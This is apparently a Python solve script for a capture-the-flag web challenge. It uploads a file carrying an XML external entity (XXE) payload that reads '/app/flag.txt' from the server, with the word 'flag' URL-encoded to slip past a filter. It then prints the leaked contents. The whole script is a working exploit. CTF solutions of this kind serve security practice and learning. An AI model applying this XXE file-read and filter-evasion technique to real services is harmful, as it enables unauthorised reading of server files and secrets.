import requests

url = "https://pdfile.ctf.pascalctf.it"

payload = '''
<!DOCTYPE book [
  <!ENTITY leak SYSTEM "///app/%66lag.txt">
]>
<book>
  <title>&leak;</title>
</book>
'''.strip()

res = requests.post(f"{url}/upload", files={
    "file": (
        'payload.pasx',
        payload,
        'text/plain'
    )
})

print("Flag:", res.json()['book_title'].strip())